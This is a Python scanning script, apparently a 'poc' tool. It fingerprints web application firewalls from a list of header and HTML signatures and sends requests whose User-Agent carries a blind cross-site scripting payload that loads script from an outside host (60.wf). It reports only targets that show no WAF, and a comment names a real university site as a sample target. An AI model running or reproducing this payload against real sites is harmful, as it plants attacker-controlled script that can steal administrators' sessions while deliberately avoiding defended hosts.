#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
import requests
import re
import urlparse

dna = '''WAF:Topsec-Waf|index|index|<META NAME="Copyright" CONTENT="Topsec Network Security Technology Co.,Ltd"/>|<META NAME="DESCRIPTION" CONTENT="Topsec web UI"/>
WAF:360|headers|X-Powered-By-360wzb|wangzhan\.360\.cn
WAF:360|url|/wzws-waf-cgi/|360wzws
WAF:Anquanbao|headers|X-Powered-By-Anquanbao|MISS
WAF:Anquanbao|url|/aqb_cc/error/|ASERVER
WAF:BaiduYunjiasu|headers|Server|yunjiasu-nginx
WAF:BigIP|headers|Server|BigIP|BIGipServer
WAF:BigIP|headers|Set-Cookie|BigIP|BIGipServer
WAF:BinarySEC|headers|x-binarysec-cache|fill|miss
WAF:BinarySEC|headers|x-binarysec-via|binarysec\.com
WAF:BlockDoS|headers|Server|BlockDos\.net
WAF:CloudFlare|headers|Server|cloudflare-nginx
WAF:Cloudfront|headers|Server|cloudfront
WAF:Cloudfront|headers|X-Cache|cloudfront
WAF:Comodo|headers|Server|Protected by COMODO
WAF:IBM-DataPower|headers|X-Backside-Transport|\A(OK|FAIL)
WAF:DenyAll|headers|Set-Cookie|\Asessioncookie=
WAF:dotDefender|headers|X-dotDefender-denied|1
WAF:Incapsula|headers|X-CDN|Incapsula
WAF:Jiasule|headers|Set-Cookie|jsluid=
WAF:KSYUN|headers|Server|KSYUN ELB
WAF:KONA|headers|Server|AkamaiGHost
WAF:ModSecurity|headers|Server|Mod_Security|NOYB
WAF:NetContinuum|headers|Cneonction|\Aclose
WAF:NetContinuum|headers|nnCoection|\Aclose
WAF:NetContinuum|headers|Set-Cookie|citrix_ns_id
WAF:Newdefend|headers|Server|newdefend
WAF:NSFOCUS|headers|Server|NSFocus
WAF:Safe3|headers|X-Powered-By|Safe3WAF
WAF:Safe3|headers|Server|Safe3 Web Firewall
WAF:Safedog|headers|X-Powered-By|WAF/2\.0
WAF:Safedog|headers|Server|Safedog
WAF:Safedog|headers|Set-Cookie|Safedog
WAF:SonicWALL|headers|Server|SonicWALL
WAF:Stingray|headers|Set-Cookie|\AX-Mapping-
WAF:Sucuri|headers|Server|Sucuri/Cloudproxy
WAF:Usp-Sec|headers|Server|Secure Entry Server
WAF:Varnish|headers|X-Varnish|.*?
WAF:Varnish|headers|Server|varnish
WAF:Wallarm|headers|Server|nginx-wallarm
WAF:WebKnight|headers|Server|WebKnight
WAF:Yundun|headers|Server|YUNDUN
WAF:Yundun|headers|X-Cache|YUNDUN
WAF:Yunsuo|headers|Set-Cookie|yunsuo
'''

def identify(header,html):
    mark_list = []
    marks = dna.strip().splitlines()
    for mark in marks:
        name, location, key, value = mark.strip().split("|", 3)
        mark_list.append([name, location, key, value])

    for mark_info in mark_list:
        name, location, key, reg = mark_info
        if location == "headers":
            if key in header and re.search(reg, header[key], re.I):
                # print(name)
                return False
        if location == "index":
            if re.search(reg, html, re.I):
                # print(name)
                return False
    
    return True

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    
    try:
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
        header["Referer"] = "http://www.qq.com"
        r = requests.get(url, headers=header, timeout=5)
        if r.status_code == 200:
            f = identify(r.headers,r.text)
            if f:
                return url
            else:
                return False
        else:
            return False
    except Exception:
        return False

# print poc("http://virtual.glxy.sdu.edu.cn/")